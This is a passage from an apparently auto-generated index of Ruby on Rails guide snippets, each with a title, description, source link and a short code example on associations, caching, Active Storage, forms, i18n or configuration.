app-storage:/rails/storage --env RAILS_MASTER_KEY=<your-config-master-key> app console\n```\n\n----------------------------------------\n\nTITLE: Setting Global Error Context in Ruby on Rails\nDESCRIPTION: Demonstrates how to set global context for error reporting using Rails.error.set_context. This context is merged with any context provided in individual error reporting calls.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.set_context(section: \"checkout\", user_id: @user.id)\n```\n\n----------------------------------------\n\nTITLE: Session Fetch Method Usage\nDESCRIPTION: Example showing usage of the new session#fetch method that behaves like Hash#fetch but saves returned value to session\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nsession#fetch\n```\n\n----------------------------------------\n\nTITLE: Creating a Book With Associations in Ruby on Rails\nDESCRIPTION: This code demonstrates how to create a new book for an author using the association methods provided by Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\n@book = @author.books.create(published_at: Time.now)\n```\n\n----------------------------------------\n\nTITLE: Pirate Translations in YAML\nDESCRIPTION: YAML configuration file containing 'pirate' language translations for the internationalized strings used in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/pirate.yml\npirate:\n  hello_world: Ahoy World\n  hello_flash: Ahoy Flash\n```\n\n----------------------------------------\n\nTITLE: Attaching File with Content Type in Rails\nDESCRIPTION: Demonstrates attaching a file with an explicit content type specification, which helps when Active Storage cannot determine the content type automatically.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(io: File.open(\"/path/to/file\"), filename: \"file.pdf\", content_type: \"application/pdf\")\n```\n\n----------------------------------------\n\nTITLE: Defining a belongs_to Association in Ruby on Rails\nDESCRIPTION: This code snippet demonstrates how to set up a belongs_to association in a Book model, establishing a relationship with the Author model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_8\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Author and Book Models with Validations in Ruby on Rails\nDESCRIPTION: This code shows the Author and Book models with associations and a validation on the Author model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_12\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/models/book.rb\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n\n# app/models/author.rb\nclass Author < ApplicationRecord\n  has_many :books\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Data in Self-Join Relationships in Rails\nDESCRIPTION: Demonstrates how to retrieve an employee's subordinates and manager using the self-join relationship defined in the Employee model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\nemployee = Employee.find(1)\nsubordinates = employee.subordinates\n```\n\n----------------------------------------\n\nTITLE: Wrapping Text with word_wrap in Ruby\nDESCRIPTION: Shows how to use the word_wrap helper to wrap text into lines of a specified width.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nword_wrap(\"Once upon a time\", line_width: 8)\n# => \"Once\\nupon a\\ntime\"\n```\n\n----------------------------------------\n\nTITLE: Using Range Types in PostgreSQL with Rails\nDESCRIPTION: Demonstrates implementation of PostgreSQL range types in Rails, showing how to create and query date ranges.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20130923065404_create_events.rb\ncreate_table :events do |t|\n  t.daterange \"duration\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/event.rb\nclass Event < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Rails App with PostgreSQL Database\nDESCRIPTION: Shows how to create a new Rails application with PostgreSQL database configuration using the --database flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new petstore --database=postgresql\n      create\n      create  app/controllers\n      create  app/helpers\n...\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Test Fixtures in YAML\nDESCRIPTION: Configuration for the storage_fixtures service in Active Storage, defining a disk-based storage location for test fixtures in a temporary directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_77\n\nLANGUAGE: yaml\nCODE:\n```\ntest_fixtures:\n  service: Disk\n  root: <%= Rails.root.join(\"tmp/storage_fixtures\") %>\n```\n\n----------------------------------------\n\nTITLE: Creating Associated Objects in Rails\nDESCRIPTION: Shows how to create and save associated objects using collection.create method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\n@book = @author.books.create(published_at: Time.now,\n                             book_number: \"A12345\")\n\n@books = @author.books.create([\n  { published_at: Time.now, book_number: \"A12346\" },\n  { published_at: Time.now, book_number: \"A12347\" }\n])\n```\n\n----------------------------------------\n\nTITLE: Implementing a Controller for STI Models\nDESCRIPTION: Shows how to create a controller specific to a child model in a Single Table Inheritance setup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/cars_controller.rb\n\nclass CarsController < ApplicationController\n  def index\n    @cars = Car.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Development Environment for Rails 3.1\nDESCRIPTION: This snippet shows the configuration settings for the development environment in Rails 3.1, focusing on asset pipeline settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_105\n\nLANGUAGE: ruby\nCODE:\n```\n# Do not compress assets\nconfig.assets.compress = false\n\n# Expands the lines which load the assets\nconfig.assets.debug = true\n```\n\n----------------------------------------\n\nTITLE: Counting Objects in a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the size method to get the count of assemblies associated with a part.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\n@assembly_count = @part.assemblies.size\n```\n\n----------------------------------------\n\nTITLE: Configuring Previous Encryption Schemes in Rails\nDESCRIPTION: Shows how to configure previous encryption schemes globally and per-attribute to maintain compatibility with existing encrypted data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.previous = [ { key_provider: MyOldKeyProvider.new } ]\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article\n  encrypts :title, deterministic: true, previous: { deterministic: false }\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query with Chained Group Clauses (SQL)\nDESCRIPTION: This SQL query shows the result of chaining `group` clauses. The query groups by `author` and `id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_128\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books GROUP BY author, id\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Flash Key Normalization\nDESCRIPTION: Example showing how flash message keys are normalized to strings in Rails 4.1\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nflash[\"string\"] = \"a string\"\nflash[:symbol] = \"a symbol\"\n\n# Rails < 4.1\nflash.keys # => [\"string\", :symbol]\n\n# Rails >= 4.1\nflash.keys # => [\"string\", \"symbol\"]\n```\n\n----------------------------------------\n\nTITLE: Executing Commands with run\nDESCRIPTION: Demonstrates how to execute an arbitrary command using the `run` method. The example removes the `README.rdoc` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nrun \"rm README.rdoc\"\n```\n\n----------------------------------------\n\nTITLE: Sharding Solid Cache Configuration in cache.yml\nDESCRIPTION: This snippet demonstrates configuring sharding for Solid Cache by specifying the database shards in the `config/cache.yml` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\n# config/cache.yml\nproduction:\n  databases: [cache_shard1, cache_shard2, cache_shard3]\n```\n\n----------------------------------------\n\nTITLE: Accessing Locals using local_assigns in Rails\nDESCRIPTION: This example demonstrates how to access the `locals` passed to a partial using the `local_assigns` method. It shows that `local_assigns[:product]` will have the value of the `@product` instance variable and `local_assigns[:product_reviews]` will be `nil` because it was not assigned a value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_15\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/show.html.erb %>\n\n<%= render partial: \"product\", locals: { product: @product } %>\n\n<%# app/views/products/_product.html.erb %>\n\n<% local_assigns[:product]          # => \"#<Product:0x0000000109ec5d10>\" %>\n<% local_assigns[:product_reviews]  # => nil %>\n```\n\n----------------------------------------\n\nTITLE: Using Authenticated Logo Path in ERB Template\nDESCRIPTION: This ERB code snippet shows how to use the authenticated logo path in a view template to display the user's logo image.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_50\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag account_logo_path %>\n```\n\n----------------------------------------\n\nTITLE: Shared Partial Caching Render Example\nDESCRIPTION: Demonstrates rendering a shared partial that can be used across different MIME types, such as HTML and JavaScript.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nrender(partial: \"hotels/hotel\", collection: @hotels, cached: true)\n```\n\n----------------------------------------\n\nTITLE: Installing Rails Upgrade Plugin\nDESCRIPTION: Command to install the Rails Upgrade plugin which helps automate the upgrade process from Rails 2.x to Rails 3.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ ruby script/plugin install git://github.com/rails/rails_upgrade.git\n```\n\n----------------------------------------\n\nTITLE: Primary Database Model Configuration in Ruby\nDESCRIPTION: ApplicationRecord configuration for connecting to primary database and its replica using connects_to.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationRecord < ActiveRecord::Base\n  self.abstract_class = true\n\n  connects_to database: { writing: :primary, reading: :primary_replica }\nend\n```\n\n----------------------------------------\n\nTITLE: Chained Ordering in Rails\nDESCRIPTION: Illustrates how multiple `order` calls are chained to append order clauses.  Subsequent calls add to the ordering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\nBook.order(\"title ASC\").order(\"created_at DESC\")\n```\n\n----------------------------------------\n\nTITLE: Action Cable Connection Session Authentication in Ruby\nDESCRIPTION: This code snippet shows an alternative way to authenticate a user using session cookies in an Action Cable connection. It accesses the user ID from the encrypted session cookie using the `_session` key and `user_id` within the session.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nverified_user = User.find_by(id: cookies.encrypted[\"_session\"][\"user_id\"])\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Environment for Rails 3.2\nDESCRIPTION: This snippet shows the mass assignment sanitizer configuration to be added to the test environment file in Rails 3.2.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\n# Raise exception on mass assignment protection for Active Record models\nconfig.active_record.mass_assignment_sanitizer = :strict\n```\n\n----------------------------------------\n\nTITLE: Generating Migration for Adding Author Association to Books in Ruby on Rails\nDESCRIPTION: This command generates a migration to add the author_id column to the books table, setting up the foreign key relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\nrails generate migration AddAuthorToBooks author:references\n```\n\n----------------------------------------\n\nTITLE: Using STI-Specific Methods on Model Instances\nDESCRIPTION: Shows how to call a method specific to the Car model on an instance retrieved from the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\ncar = Car.first\ncar.honk\n# => 'Beep Beep'\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Boolean Equality in Rails\nDESCRIPTION: This SQL query is generated by the previous Ruby code and demonstrates how Active Record translates the boolean condition into a SQL `WHERE` clause comparing the `out_of_print` column to 1 (true).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_59\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE (books.out_of_print = 1)\n```\n\n----------------------------------------\n\nTITLE: Database Connection Switching with Connected_to\nDESCRIPTION: Example of using connected_to for switching database connections in Rails 6.1. This functionality enables per-database connection management.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_1_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nconnected_to(role: :reading)\n```\n\n----------------------------------------\n\nTITLE: Adding Confirmation to Button in Rails ERB\nDESCRIPTION: This example shows how to add a confirmation dialog to a button created with the button_to helper in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_15\n\nLANGUAGE: erb\nCODE:\n```\n<%= button_to \"Delete post\", post, method: :delete, form: { data: { turbo_confirm: \"Are you sure?\" } } %>\n```\n\n----------------------------------------\n\nTITLE: Ordering with ASC/DESC in Rails\nDESCRIPTION: Shows how to specify ascending or descending order using symbols and strings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nBook.order(created_at: :desc)\n# OR\nBook.order(created_at: :asc)\n# OR\nBook.order(\"created_at DESC\")\n# OR\nBook.order(\"created_at ASC\")\n```\n\n----------------------------------------\n\nTITLE: Set Strong ETag on Response\nDESCRIPTION: This snippet shows how to directly set a strong ETag on the response object by assigning the response body to `response.strong_etag`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nresponse.strong_etag = response.body # => \"618bbc92e2d35ea1945008b42799b0e7\"\n```\n\n----------------------------------------\n\nTITLE: Select Box with Value-Label pairs in ERB\nDESCRIPTION: This ERB code uses `form.select` to generate a select box with value-label pairs for each city.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_33\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.select :city, [[\"Berlin\", \"BE\"], [\"Chicago\", \"CHI\"], [\"Madrid\", \"MD\"]] %>\n```\n\n----------------------------------------\n\nTITLE: Low-Level Caching: Delete from Cache\nDESCRIPTION: Demonstrates deleting a value from the cache using `Rails.cache.delete`.  The value stored with the key \"greeting\" is removed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# Delete a value from the cache\nRails.cache.delete(\"greeting\")\n```\n\n----------------------------------------\n\nTITLE: Defining an Optional belongs_to Association in Ruby on Rails\nDESCRIPTION: This snippet shows how to set up an optional belongs_to association in a Book model, allowing the author to be null.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_10\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, optional: true\nend\n```\n\n----------------------------------------\n\nTITLE: Manual CSRF Token Implementation in HTML\nDESCRIPTION: Example of adding CSRF token manually to HTML head section using the form_authenticity_token helper method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<!-- app/views/layouts/application.html.erb -->\n<head>\n  <meta name=\"csrf-token\" content=\"<%= form_authenticity_token %>\">\n</head>\n```\n\n----------------------------------------\n\nTITLE: Creating Inline Email Attachments\nDESCRIPTION: Implementation of inline attachments in emails with both Ruby mailer method and ERB template usage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef welcome\n  attachments.inline[\"image.jpg\"] = File.read(\"/path/to/image.jpg\")\nend\n```\n\nLANGUAGE: html\nCODE:\n```\n<p>Hello there, this is the image you requested:</p>\n\n<%= image_tag attachments['image.jpg'].url %>\n\n<p>Hello there, this is our image</p>\n\n<%= image_tag attachments['image.jpg'].url, alt: 'My Photo', class: 'photos' %>\n```\n\n----------------------------------------\n\nTITLE: Creating Submit Buttons with button_to in Ruby on Rails\nDESCRIPTION: Demonstrates the use of button_to helper to generate a form with a submit button for a given URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n<%= button_to \"Sign in\", sign_in_path %>\n```\n\n----------------------------------------\n\nTITLE: Updating ArticlesController to Permit Author Name Parameter\nDESCRIPTION: Ruby code to update the article_params method in the Blorgh engine's ArticlesController to permit the author_name parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\ndef article_params\n  params.expect(article: [:title, :text, :author_name])\nend\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests with Parallel Workers\nDESCRIPTION: This command demonstrates how to run Rails tests with a specified number of parallel workers using the `PARALLEL_WORKERS` environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_113\n\nLANGUAGE: bash\nCODE:\n```\n$ PARALLEL_WORKERS=15 bin/rails test\n```\n\n----------------------------------------\n\nTITLE: Multiple Stylesheet Includes (Rails/ERB)\nDESCRIPTION: This example demonstrates including multiple CSS files (`main.css` and `columns.css`) using the `stylesheet_link_tag` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_48\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"main\", \"columns\" %>\n```\n\n----------------------------------------\n\nTITLE: Authentication Generator Command - Bash\nDESCRIPTION: This bash command uses the rails generator to create the authentication scaffolding, including the User and Session models, controllers, and views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_66\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate authentication\n```\n\n----------------------------------------\n\nTITLE: Basic Single Database Configuration in YAML\nDESCRIPTION: Initial database.yml configuration for a single primary database using MySQL2 adapter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  database: my_primary_database\n  adapter: mysql2\n  username: root\n  password: <%= ENV['ROOT_PASSWORD'] %>\n```\n\n----------------------------------------\n\nTITLE: Creating Rails App with JavaScript Bundler in Bash\nDESCRIPTION: Commands to create a new Rails application with a specific JavaScript bundler (e.g., Bun) instead of using import maps.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_new_app --javascript=bun\nOR\n$ rails new my_new_app -j bun\n```\n\n----------------------------------------\n\nTITLE: Rails Root Path Usage in Ruby\nDESCRIPTION: Demonstrates the new Rails.root functionality returning a Pathname object that can be used with the join method\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nRails.root\n```\n\nLANGUAGE: ruby\nCODE:\n```\nFile.join\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - i18n_key (IRB)\nDESCRIPTION: Demonstrates the `i18n_key` method of `model_name` from `ActiveModel::Naming`. It returns the name of the i18n key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_30\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.i18n_key\n=> :person\n```\n\n----------------------------------------\n\nTITLE: Getting Rails Version in Console\nDESCRIPTION: This command retrieves and displays the version of the Rails framework being used in the application. It is executed within the Rails console environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_10\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Rails.version\n```\n\n----------------------------------------\n\nTITLE: Skipping Solid Cache when Creating a New Rails Application\nDESCRIPTION: This command shows how to skip the installation of Solid Cache when creating a new Rails application using the `--skip-solid` flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_22\n\nLANGUAGE: bash\nCODE:\n```\nrails new app_name --skip-solid\n```\n\n----------------------------------------\n\nTITLE: Rendering a Template from Another Controller\nDESCRIPTION: Renders a template located in a different controller's view directory. Specifies the full path to the template relative to `app/views`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nrender \"products/show\"\n```\n\n----------------------------------------\n\nTITLE: Simple ERB View\nDESCRIPTION: Simple HTML view with embedded Ruby (ERB) to display a static message. Used by default rendering mechanism in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_2\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Books are coming soon!</h1>\n```\n\n----------------------------------------\n\nTITLE: Generated HTML Form Example\nDESCRIPTION: This code snippet shows an example of the HTML output generated by the form helpers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_68\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/people\" accept-charset=\"UTF-8\" method=\"post\">\n  <!-- ... -->\n  <label for=\"person_first_name\">First name</label>\n  <input type=\"text\" name=\"person[first_name]\" id=\"person_first_name\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Adding Author Name Field to Article Form in ERB\nDESCRIPTION: HTML+ERB code for adding an author_name field to the article form in the Blorgh engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_38\n\nLANGUAGE: html+erb\nCODE:\n```\n<div class=\"field\">\n  <%= form.label :author_name %><br>\n  <%= form.text_field :author_name %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Example of Documentation with Code Results Alignment\nDESCRIPTION: Shows how to align the results of code examples with the `# =>` convention, keeping vertical alignment for readability even with varying line lengths.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# For checking if an integer is even or odd.\n#\n#   1.even? # => false\n#   1.odd?  # => true\n#   2.even? # => true\n#   2.odd?  # => false\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial in a View\nDESCRIPTION: This code snippet demonstrates how to render a partial in a Rails view using the `render` method.  It renders the `_menu.html.erb` partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_69\n\nLANGUAGE: html\nCODE:\n```\n<%= render \"menu\" %>\n```\n\n----------------------------------------\n\nTITLE: Initializing Active Storage in ESM Module\nDESCRIPTION: Demonstrates how to import and start Active Storage when using it as an ESM module in a script tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_62\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"module-shim\">\n  import * as ActiveStorage from \"@rails/activestorage\"\n  ActiveStorage.start()\n</script>\n```\n\n----------------------------------------\n\nTITLE: Generating a Rails Application with Bun JavaScript Support\nDESCRIPTION: Command to create a new Rails application with Bun as the JavaScript package manager, a new feature in Rails 8.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_new_app --javascript=bun\n```\n\n----------------------------------------\n\nTITLE: Overriding Permissions-Policy in a Rails Controller\nDESCRIPTION: This snippet shows how to override the global Permissions-Policy configuration for a specific controller in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nclass PagesController < ApplicationController\n  permissions_policy do |policy|\n    policy.geolocation \"https://example.com\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Total of Grouped Items in Rails\nDESCRIPTION: Illustrates how to get the total count of items within each group by chaining `count` after `group`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_95\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.group(:status).count\n```\n\n----------------------------------------\n\nTITLE: Generator with Template Copy Implementation\nDESCRIPTION: Generator implementation that copies a template file to create an initializer\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass InitializerGenerator < Rails::Generators::NamedBase\n  source_root File.expand_path(\"templates\", __dir__)\n\n  def copy_initializer_file\n    copy_file \"initializer.rb\", \"config/initializers/#{file_name}.rb\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Spanish Locale File Example - YAML\nDESCRIPTION: This YAML snippet shows an example of a Spanish locale file (es.yml) with a simple translation for the \"hello\" key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_89\n\nLANGUAGE: yaml\nCODE:\n```\nes:\n  hello: \"Hola mundo\"\n```\n\n----------------------------------------\n\nTITLE: Including JavaScript Module in HTML Layout\nDESCRIPTION: HTML snippet showing how to include a JavaScript module in a layout file when using Propshaft's asset pipeline.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"module\" src=\"main.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailer Queue Name in Rails 5\nDESCRIPTION: Configuration to change the default queue name for Action Mailer background jobs from 'mailers' to a custom queue name in Rails 5.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.deliver_later_queue_name = :new_queue_name\n```\n\n----------------------------------------\n\nTITLE: Header-Only Response Example (Rails/Ruby)\nDESCRIPTION: This example demonstrates using the `head` method to send a 'created' response with a `location` header.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nhead :created, location: photo_path(@photo)\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Store in Ruby on Rails\nDESCRIPTION: Sets up the session store using the config.session_store option in Rails configuration. This affects the availability of flash keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.session_store\n```\n\n----------------------------------------\n\nTITLE: Creating New Rails 3.0 Application\nDESCRIPTION: Basic commands to create and initialize a new Rails 3.0 application using the rails new generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# You should have the 'rails' RubyGem installed\n$ rails new myapp\n$ cd myapp\n```\n\n----------------------------------------\n\nTITLE: Configuring transactional callback error handling in Rails 4.2\nDESCRIPTION: Configuration to opt into the new behavior where errors in after_rollback or after_commit callbacks will propagate normally rather than being suppressed and only logged.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.raise_in_transactional_callbacks = true\n```\n\n----------------------------------------\n\nTITLE: Using to_model in Active Model (IRB)\nDESCRIPTION: This snippet demonstrates the use of the `to_model` method in Active Model. The `to_model` method returns the object itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_15\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new(1)\nirb> person.to_model == person\n=> true\n```\n\n----------------------------------------\n\nTITLE: Declaring acts_as_yaffle for Wickwall with Custom Field - ActiveRecord Model Extension - Ruby\nDESCRIPTION: Extends the Wickwall model to call acts_as_yaffle with a custom yaffle_text_field option, demonstrating the plugin's configurability. Ensures the 'squawk' method and others will use the 'last_tweet' field as configured. Requires previous inclusion of plugin code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# test/dummy/app/models/wickwall.rb\n\nclass Wickwall < ApplicationRecord\n  acts_as_yaffle yaffle_text_field: :last_tweet\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Complex Links with link_to Blocks in Ruby on Rails\nDESCRIPTION: Shows how to use link_to with a block to create more complex link content.\nSOURCE: 